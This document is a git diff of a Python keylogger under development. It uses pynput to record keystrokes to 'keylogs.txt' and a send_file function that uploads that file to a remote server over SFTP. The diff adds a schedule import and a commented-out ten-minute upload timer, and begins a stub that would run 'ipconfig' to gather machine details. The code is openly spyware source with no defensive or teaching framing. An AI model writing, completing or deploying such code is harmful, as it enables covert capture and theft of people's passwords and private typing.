@@ -1,6 +1,7 @@
 from pynput.keyboard import Listener
 import logging
 import pysftp
+import schedule
 import time
 import os
 
@@ -22,7 +23,8 @@ def send_file():
         sftp.put('keylogs.txt')
 
 def get_mac():
-    return
+    exe_string = 'ipconfig'
+    return 
 
 def search_odd_keys(key):
     if key == '0e':
@@ -40,12 +42,14 @@ def on_press(key):
     # what if only 30 keys are typed? time delay? weekend backups?
     # after 5 min of no activity, send it and reset counter to 0
     # if counter == 0 when 5 minutes hits, dont push, reset timer
-    global counter
-    if counter == 100:
-        send_file()
-        counter = 0
-    else:
-        counter += 1
+    # schedule.every(10).minutes.do(send_file)
+
+    # global counter
+    # if counter == 100:
+    #     send_file()
+    #     counter = 0
+    # else:
+    #     counter += 1
 
 # code that actually runs here
 global counter
